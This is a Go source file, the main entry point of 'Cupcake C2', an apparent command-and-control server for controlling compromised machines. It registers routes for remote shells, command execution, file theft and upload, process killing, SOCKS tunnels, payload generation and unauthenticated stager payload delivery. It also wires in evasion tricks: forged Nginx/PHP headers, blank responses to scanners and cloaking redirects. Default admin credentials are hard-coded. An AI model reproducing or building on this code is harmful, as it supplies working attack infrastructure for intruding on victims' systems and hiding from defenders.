package main

import (
	"embed"
	"fmt"
	"io/fs"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"

	"cupcake-server/controllers"
	"cupcake-server/pkg/config"
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/middleware"
	"cupcake-server/pkg/store"
	"cupcake-server/services"
)

//go:embed dist/*
var embeddedFiles embed.FS

func main() {
	cfg, err := config.LoadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	store.InitDB()
	store.ResetAllAgentsOffline()
	go services.RestoreListeners()
	go services.RestoreTunnels()

	gin.SetMode(gin.ReleaseMode)
	adminRouter := gin.New()
	adminRouter.Use(gin.Recovery())

	// CORS: 仅允许来自同一主机的请求（C2平台无需跨域），防止 CSRF
	corsConfig := cors.DefaultConfig()
	corsConfig.AllowAllOrigins = false
	corsConfig.AllowOriginFunc = func(origin string) bool {
		// 允许同源（相同主机和端口）以及本地开发地址
		allowedPrefixes := []string{
			"http://127.0.0.1",
			"https://127.0.0.1",
			"http://localhost",
			"https://localhost",
		}
		for _, prefix := range allowedPrefixes {
			if strings.HasPrefix(origin, prefix) {
				return true
			}
		}
		return false
	}
	corsConfig.AllowHeaders = []string{"Origin", "Content-Length", "Content-Type", "Authorization"}
	adminRouter.Use(cors.New(corsConfig))

	// OpSec Middleware: Mask server fingerprints
	adminRouter.Use(func(c *gin.Context) {
		c.Writer.Header().Set("Server", "Nginx/1.18.0 (Ubuntu)")
		c.Writer.Header().Set("X-Powered-By", "PHP/7.4.3") // Fake technology stack
		c.Next()
	})

	adminRouter.Use(middleware.AuthMiddleware())

	// 🚀 Public routes (no auth required) - Stager payload delivery
	adminRouter.GET("/api/s/bin/:id", controllers.HandleServeRawPayload)
	adminRouter.GET("/api/s/:id", controllers.HandleServePayload)

	api := adminRouter.Group("/api")
	{
		api.GET("/dashboard", controllers.GetDashboard)
		api.GET("/clients", controllers.GetClients)
		api.GET("/clients/history/:uuid", controllers.HandleGetAgentHistory)
		api.DELETE("/clients/:uuid", controllers.DeleteClient)
		api.POST("/clients/migrate", controllers.MigrateClient)
		api.POST("/cmd", controllers.SendCommand)
		api.GET("/resp", controllers.GetResponse)

		api.GET("/listeners", controllers.ListListeners)
		api.POST("/listeners", controllers.CreateListener)
		api.POST("/listeners/:id/stop", controllers.StopListener)
		api.POST("/listeners/:id/start", controllers.StartListener)
		api.DELETE("/listeners/:id", controllers.DeleteListener)

		api.POST("/tunnel/start", controllers.StartTunnel)
		api.POST("/tunnel/stop", controllers.StopTunnel)
		api.POST("/tunnel/delete", controllers.DeleteTunnelController)
		api.GET("/tunnel", controllers.ListTunnels)

		api.POST("/socks/start", controllers.StartSocks)
		api.POST("/socks/stop", controllers.StopSocks)
		api.POST("/socks/delete", controllers.DeleteTunnelController)
		api.GET("/socks", controllers.ListSocks)

		files := api.Group("/files")
		{
			files.GET("/list", controllers.ListFilesController)
			files.GET("/read", controllers.ReadFileController)
			files.POST("/delete", controllers.DeleteFilesController)
			files.POST("/upload", controllers.Upload)
			files.GET("/download", controllers.HandleFsDownload)
		}

		processes := api.Group("/processes")
		{
			processes.GET("/list", controllers.ListProcesses)
			processes.POST("/kill", controllers.KillProcess)
		}

		api.GET("/shell/:uuid", controllers.HandleAdminShell)
		api.GET("/pty/:uuid", controllers.StreamPTY)

		plugins := api.Group("/plugins")
		{
			plugins.GET("", controllers.HandleListPlugins)
			plugins.POST("/run", controllers.HandleRunPlugin)
			plugins.POST("/upload", controllers.HandleUploadPlugin)
			plugins.DELETE("/:id", controllers.HandleDeletePlugin)
			plugins.GET("/result/:task_id", controllers.HandleGetPluginResult)
		}

		api.GET("/build/logs/:task_id", controllers.HandleBuildLogsWS)

		transfer := api.Group("/transfer")
		{
			services.InitTransfer()
			transfer.POST("/upload", services.HandleAgentUpload)
			transfer.GET("/download/:filename", services.HandleAgentDownload)
			transfer.Static("/static", "./storage/public_tools")
		}

		settings := api.Group("/settings")
		{
			settings.GET("/users", controllers.HandleGetUsers)
			settings.POST("/users", controllers.HandleAddUser)
			settings.PUT("/users/:id", controllers.HandleUpdateUser)
			settings.DELETE("/users/:id", controllers.HandleDeleteUser)
			settings.GET("/logs/login", controllers.HandleGetLoginLogs)
			settings.GET("/config", controllers.HandleGetSettings)
			settings.POST("/config", controllers.HandleUpdateSettings)
			settings.GET("/webhooks", controllers.HandleGetWebhooks)
			settings.POST("/webhooks", controllers.HandleSaveWebhook)
			settings.DELETE("/webhooks/:id", controllers.HandleDeleteWebhook)
		}

		api.POST("/agents/connect", controllers.HandleConnectBindAgent)
		api.POST("/generate", controllers.HandleGenerate)
		api.GET("/generate/stream", controllers.HandleGenerateStream)
		api.GET("/stager", controllers.HandleGetStager)
		// /api/s/:id is registered as public route above (no auth)
		// 保护下载：不再致录暴露，改为通过控制器注入 AuthMiddleware 展中提供文件
		api.GET("/payloads/:filename", controllers.HandleServeProtectedPayload)

		api.POST("/auth/login", controllers.HandleLogin)
		api.POST("/auth/logout", func(c *gin.Context) { c.JSON(200, gin.H{"msg": "logged out"}) })
		api.POST("/maintenance/reset", controllers.HandleMaintenanceReset)
		api.GET("/maintenance/export", controllers.HandleMaintenanceExport)
		api.POST("/maintenance/update_templates", controllers.HandleUpdateTemplates)
	}

	distFS, _ := fs.Sub(embeddedFiles, "dist")
	staticServer := http.FileServer(http.FS(distFS))

	adminRouter.NoRoute(func(c *gin.Context) {
		path := c.Request.URL.Path
		cloakTarget := store.GetSetting("opsec_cloak_url")

		// 1. Handle API 404 (Cleanup) - No Auth needed here as it's handled by middleware
		if strings.HasPrefix(path, "/api/") {
			c.Status(http.StatusNotFound)
			c.Abort()
			return
		}

		// 2. OpSec Layer: HTTP Basic Auth for Web UI (The "Nginx Style" Lock)
		user, password, hasAuth := c.Request.BasicAuth()
		secretUser := store.GetSetting("web_auth_user")
		secretPass := store.GetSetting("web_auth_password")

		// Default credentials if not yet set in DB
		if secretUser == "" { secretUser = "admin" }
		if secretPass == "" { secretPass = "cupcake123" }

		if !hasAuth || user != secretUser || password != secretPass {
			// Trigger browser login popup
			c.Writer.Header().Set("WWW-Authenticate", `Basic realm="Restricted Content"`)
			c.Status(http.StatusUnauthorized)
			// Return blank page for scanners
			c.Writer.Write([]byte("")) 
			c.Abort()
			return
		}

		// 3. For non-API routes when authorized, handle Cloaking (if path is weird)
		if cloakTarget != "" && path != "/" && path != "/index.html" && !strings.Contains(path, "assets") {
			c.Redirect(http.StatusFound, cloakTarget)
			return
		}

		// 4. Serve Static Files (Vue UI)
		cleanPath := strings.TrimPrefix(path, "/")
		if cleanPath == "" { cleanPath = "index.html" }
		f, err := distFS.Open(cleanPath)
		if err == nil {
			f.Close()
			staticServer.ServeHTTP(c.Writer, c.Request)
			return
		}

		// SPA Fallback
		index, _ := distFS.Open("index.html")
		defer index.Close()
		stat, _ := index.Stat()
		c.DataFromReader(200, stat.Size(), "text/html; charset=utf-8", index, nil)
	})

	banner := `
    ______  __    __  .______     ______      ___       __  ___  _______ 
   /      ||  |  |  | |   _  \   /      |    /   \     |  |/  / |   ____|
  |  ,----'|  |  |  | |  |_)  | |  ,----'   /  ^  \    |  '  /  |  |__   
  |  |     |  |  |  | |   ___/  |  |       /  /_\  \   |    <   |   __|  
  |  '----.|  '--'  | |  |      |  '----. /  _____  \  |  .  \  |  |____ 
   \______| \______/  | _|       \______|/__/     \__\ |__|\__\ |_______|
                                                                         
                          >> BY Timao <<
`
	fmt.Println("\x1b[35m" + banner + "\x1b[0m")
	fmt.Println("\x1b[36mCupcake C2 控制终端\x1b[0m")
	fmt.Printf("\x1b[32m[+]\x1b[0m Web UI: http://127.0.0.1:%d\n", cfg.AdminPort)
	fmt.Println("-----------------------------------------")
	fmt.Printf("\x1b[32m[+]\x1b[0m 默认账户: admin\n")
	fmt.Printf("\x1b[32m[+]\x1b[0m 默认密码: cupcake123\n")
	mcpToken := store.GetSetting("system_api_token")
	if mcpToken != "" {
		fmt.Printf("\x1b[32m[+]\x1b[0m MCP API Key: %s\n", mcpToken)
	}
	fmt.Println("-----------------------------------------")

	// Display active listeners after they restore
	go func() {
		time.Sleep(2 * time.Second) // Wait for RestoreListeners to finish
		var activePorts []string
		globals.Listeners.Range(func(key, value interface{}) bool {
			ln := value.(*globals.Listener)
			if ln.Status == "Running" {
				activePorts = append(activePorts, fmt.Sprintf("%s://0.0.0.0:%d (%s)", strings.ToLower(ln.Protocol), ln.Port, ln.ID))
			}
			return true
		})
		if len(activePorts) > 0 {
			fmt.Printf("\x1b[32m[+]\x1b[0m Active Listeners:\n")
			for _, p := range activePorts {
				fmt.Printf("    • %s\n", p)
			}
		} else {
			fmt.Printf("\x1b[33m[!]\x1b[0m No active listeners\n")
		}
	}()

	if err := adminRouter.Run(fmt.Sprintf(":%d", cfg.AdminPort)); err != nil {
		log.Fatal(err)
	}
}
